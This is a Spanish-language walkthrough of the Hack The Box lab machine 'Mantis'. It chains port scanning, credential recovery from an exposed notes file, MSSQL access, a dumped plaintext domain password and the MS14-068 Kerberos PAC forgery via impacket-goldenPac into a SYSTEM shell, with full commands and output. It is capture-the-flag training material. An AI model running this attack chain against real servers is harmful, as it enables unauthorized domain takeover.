---
tags:
title: Mantis - Hard (HTB)
permalink: /Mantis-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento 

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,49152,49153,49154,49155,49157,49158,49161,49166,49168,50255 10.10.10.52
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-02 12:23 EDT
Nmap scan report for 10.10.10.52
Host is up (0.30s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-10-02 16:23:45Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
|_ssl-date: 2025-10-02T16:25:06+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.10.52:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-02T16:21:22
|_Not valid after:  2055-10-02T16:21:22
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
9389/tcp  open  mc-nmf       .NET Message Framing
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49166/tcp open  msrpc        Microsoft Windows RPC
49168/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.52:50255: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-02T16:21:22
|_Not valid after:  2055-10-02T16:21:22
| ms-sql-info: 
|   10.10.10.52:50255: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 50255
|_ssl-date: 2025-10-02T16:25:06+00:00; 0s from scanner time.
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2025-10-02T12:24:53-04:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: mean: 34m17s, deviation: 1h30m45s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2025-10-02T16:24:49
|_  start_date: 2025-10-02T16:21:11

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.41 seconds
```

# Service enumeration 

### Port 80

```bash
gobuster dir -t 30 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://10.10.10.52:1337/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.52:1337/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/22 17:57:30 Starting gobuster in directory enumeration mode
===============================================================
/orchard              (Status: 500) [Size: 3026]
/secure_notes         (Status: 301) [Size: 160] [--> http://10.10.10.52:1337/secure_notes/]
```

Una vez vamos a la pagina principal y accedemos a esta ruta vemos lo siguiente.

![Untitled 46 1](images/Untitled 46 1.jpg)

Vemos que un archivo `.txt`, asi que pasamos a ver su contenido.

```bash
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location. 
4. Launch browser and navigate to http://localhost:8080 
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user. 

Credentials stored in secure format
OrchardCMS admin creadentials
010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
```

Vemos un nombre de usuario que es `admin` y ademas una cadena en binario que si nos vamos a ciberchief a decodificar la misma vemos que nos da como resultado :

--> Binario : `@dm!n_P@ssW0rd!`

Y ademas si nos fijamos bien el nombre del archivo `.txt` esta en formato `base64`, decodificando nos da este resultado.

--> Base64: `m$$ql_S@_P@ssW0rd!`

### Port 1433 MSSQL

Debido a que tenemos credenciales que al parecer son validad podemos tratar de conectarnos a la base de datos `sql` de microsoft con la herramienta `impacket-mssqlclient`.

```bash
mssqlclient.py 'htb.local/admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

Intentando hacer uso de `xp_cmdshell` de mssql vemos que nos da error.

```bash
SQL>xp_cmdshell whoami
ERROR(MANTIS\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```

Asi que voy intentar habilitarla con el propio comando de `mssqlclient`.

```bash
SQL (admin  admin@master)> enable_xp_cmdshell
```

Una vez dentro listamos las bases de datos existentes.

```bash
SELECT name FROM sys.databases;
name        
---------   
master      

tempdb      

model       

msdb        

orcharddb
```

Y vemos la base de datos que se menciona en el archivo que encontramos en la pagina web. La seleccionamos y listamos tablas.

```bash
USE orcharddb;
ENVCHANGE(DATABASE): Old Value: master, New Value: orcharddb
INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'orcharddb'.
SQL (admin  admin@orcharddb)> SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE';
TABLE_SCHEMA   TABLE_NAME                                             
------------   ----------------------------------------------------   
dbo            blog_Orchard_Blogs_RecentBlogPostsPartRecord           

dbo            blog_Orchard_Blogs_BlogArchivesPartRecord              

dbo            blog_Orchard_Workflows_TransitionRecord                

dbo            blog_Orchard_Workflows_WorkflowRecord                  

dbo            blog_Orchard_Workflows_WorkflowDefinitionRecord        

dbo            blog_Orchard_Workflows_AwaitingActivityRecord          

dbo            blog_Orchard_Workflows_ActivityRecord                  

dbo            blog_Orchard_Tags_TagsPartRecord                       

dbo            blog_Orchard_Framework_DataMigrationRecord             

dbo            blog_Orchard_Tags_TagRecord                            

dbo            blog_Orchard_Tags_ContentTagRecord                     

dbo            blog_Settings_ContentFieldDefinitionRecord             

dbo            blog_Orchard_Framework_DistributedLockRecord           

dbo            blog_Settings_ContentPartDefinitionRecord              

dbo            blog_Settings_ContentPartFieldDefinitionRecord         

dbo            blog_Settings_ContentTypeDefinitionRecord              

dbo            blog_Settings_ContentTypePartDefinitionRecord          

dbo            blog_Settings_ShellDescriptorRecord                    

dbo            blog_Settings_ShellFeatureRecord                       

dbo            blog_Settings_ShellFeatureStateRecord                  

dbo            blog_Settings_ShellParameterRecord                     

dbo            blog_Settings_ShellStateRecord                         

dbo            blog_Orchard_Framework_ContentItemRecord               

dbo            blog_Orchard_Framework_ContentItemVersionRecord        

dbo            blog_Orchard_Framework_ContentTypeRecord               

dbo            blog_Orchard_Framework_CultureRecord                   

dbo            blog_Common_BodyPartRecord                             

dbo            blog_Common_CommonPartRecord                           

dbo            blog_Common_CommonPartVersionRecord                    

dbo            blog_Common_IdentityPartRecord                         

dbo            blog_Containers_ContainerPartRecord                    

dbo            blog_Containers_ContainerWidgetPartRecord              

dbo            blog_Containers_ContainablePartRecord                  

dbo            blog_Title_TitlePartRecord                             

dbo            blog_Navigation_MenuPartRecord                         

dbo            blog_Navigation_AdminMenuPartRecord                    

dbo            blog_Scheduling_ScheduledTaskRecord                    

dbo            blog_Orchard_ContentPicker_ContentMenuItemPartRecord   

dbo            blog_Orchard_Alias_AliasRecord                         

dbo            blog_Orchard_Alias_ActionRecord                        

dbo            blog_Orchard_Autoroute_AutoroutePartRecord             

dbo            blog_Orchard_Users_UserPartRecord                      

dbo            blog_Orchard_Roles_PermissionRecord                    

dbo            blog_Orchard_Roles_RoleRecord                          

dbo            blog_Orchard_Roles_RolesPermissionsRecord              

dbo            blog_Orchard_Roles_UserRolesPartRecord                 

dbo            blog_Orchard_Packaging_PackagingSource                 

dbo            blog_Orchard_Recipes_RecipeStepResultRecord            

dbo            blog_Orchard_OutputCache_CacheParameterRecord          

dbo            blog_Orchard_MediaProcessing_ImageProfilePartRecord    

dbo            blog_Orchard_MediaProcessing_FilterRecord              

dbo            blog_Orchard_MediaProcessing_FileNameRecord            

dbo            blog_Orchard_Widgets_LayerPartRecord                   

dbo            blog_Orchard_Widgets_WidgetPartRecord                  

dbo            blog_Orchard_Comments_CommentPartRecord                

dbo            blog_Orchard_Comments_CommentsPartRecord               

dbo            blog_Orchard_Taxonomies_TaxonomyPartRecord             

dbo            blog_Orchard_Taxonomies_TermPartRecord                 

dbo            blog_Orchard_Taxonomies_TermContentItem                

dbo            blog_Orchard_Taxonomies_TermsPartRecord                

dbo            blog_Orchard_MediaLibrary_MediaPartRecord              

dbo            blog_Orchard_Blogs_BlogPartArchiveRecordç
```

Vemos que son demasiadas tablas, pero una vez enumero todas solo una contiene algo interesante.

```bash
SELECT TOP 50 * FROM dbo.blog_Orchard_Users_UserPartRecord;
Id   UserName   Email             NormalizedUserName   Password                                                               PasswordFormat   HashAlgorithm   PasswordSalt               RegistrationStatus   EmailStatus   EmailChallengeToken   CreatedUtc            LastLoginUtc          LastLogoutUtc         
--   --------   ---------------   ------------------   --------------------------------------------------------------------   --------------   -------------   ------------------------   ------------------   -----------   -------------------   -------------------   -------------------   -------------------   
 2   admin                        admin                AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==   Hashed           PBKDF2          UBwWF1CQCsaGc/P7jIR/kg==   Approved             Approved      NULL                  2017-09-01 13:44:01   2017-09-01 14:03:50   2017-09-01 14:06:31   

15   James      james@htb.local   james                J@m3s_P@ssW0rd!                                                        Plaintext        Plaintext       NA                         Approved             Approved      NULL                  2017-09-01 13:45:44   NULL                  NULL
```

Vemos que hay un usuario del dominio el cual es `james` con su contraseña `J@m3s_P@ssW0rd!`. Validemos las credenciales usando `crackmapexec`.

```bash
crackmapexec smb 10.10.10.52 -d htb.local -u james -p 'J@m3s_P@ssW0rd!'
SMB         10.10.10.52     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.52     445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd! 
```

# Explotacion 

El usuario es valido a nivel de dominio pero debido a que `WinRM` no esta habilitado, solo podemos seguir enumerando, para eso voy a usar `bloodhound-python` para recolectar todas las conexiones del dominio, como `forests`, `gpos`, etc 

```bash
python3 bloodhound.py -c ALL -u 'james' -p 'J@m3s_P@ssW0rd!' -d 'htb.local' -ns 10.10.10.52
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: mantis.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: mantis.htb.local
INFO: Found 4 users
INFO: Found 41 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: mantis.htb.local
INFO: Done in 00M 11S
```

No vemos nada interesante en `bloodhound`, pero volviendo al escaneo de `nmap` vemos que la version del sistema es :

```bash
Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
```

Para esta version de este año en concreto hay demasidas vulnerabilidades conocidas como el famoso `Eternal Blue`, en mi caso probe cada una de estas pero ninguna funciono, hasta que llegue a `MS14-068`.

> `MS14-068` en resumen, es una vulnerabilidad de validación de la firma de `PAC`, lo que permite crear un `PAC` que otorga poderosos derechos a un usuario sin dejar de ser legítimo a los ojos del `KDC`, es algo similar al ataque de `Golden Ticket` pero solo que en este no necesitamos saber de `krbtgt`, este ataque vulnerabilidad consiste en generar un ticket.

Para lograr escalar privilegios abusando de esta vuln podemos usar de la herramienta en especifica [pyKek](https://github.com/mubix/pykek) o de `impacket-goldenPac`. 
En mi caso voy a usar la tool de impacket, pero apuntando el `FQDN` que es el que esta ampliamente unido al protocolo `Kerberos` -> `DNS`. para averiguar la direccion del `FQDN` podemos volver a revisar nuestro escaneo de `nmap` o haciendo uso de herraminetas como `enum4linux`.

```bash
impacket-goldenPac -dc-ip 10.10.10.52 'htb.local/james:J@m3s_P@ssW0rd!@mantis.htb.local'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[-] Couldn't get forest info (SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.), continuing
[*] Attacking domain controller 10.10.10.52
[*] 10.10.10.52 found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file leYFURjF.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service DKrY on mantis.htb.local.....
[*] Starting service DKrY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

